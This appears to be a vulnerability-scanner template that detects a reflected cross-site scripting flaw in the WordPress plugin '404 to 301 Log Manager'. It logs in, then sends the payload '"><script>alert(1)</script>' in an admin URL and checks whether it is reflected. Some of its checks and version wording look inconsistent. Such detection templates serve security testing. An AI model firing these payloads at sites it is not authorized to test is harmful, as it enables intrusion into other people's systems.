id: 404-to-301-xss
brief:
    title: WordPress 404 to 301 Log Manager <3.1.2 - Cross-Site Scripting
    by: Akincibor
    level: medium
    about: WordPress 404 to 301 Log Manager 3.1.2 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
    label:
        - wpscan
        - wp-plugin
        - xss
        - wp
        - wordpress
        - authenticated
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - '"><script>alert(1)</script>'
            - 404 Error Logs
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script>'
      signs:
        - "on": word
          has:
            - '"><script>alert(1)</script>'
            - 404 Error Logs
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
